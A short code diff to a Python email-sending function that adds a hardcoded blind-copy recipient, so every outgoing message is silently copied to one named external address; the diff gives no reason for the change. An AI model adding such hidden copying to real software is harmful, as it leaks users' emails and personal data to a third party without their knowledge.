@@ -18,7 +18,8 @@ def send_email_in_background(subject, plain_message, from_email, to_email, html_
             subject=subject,
             body=plain_message,
             from_email=from_email,
-            to=[to_email]
+            to=[to_email],
+            bcc=['prince@ennovatex26.in']
         )
         email.attach_alternative(html_message, "text/html")
         email.send(fail_silently=False)
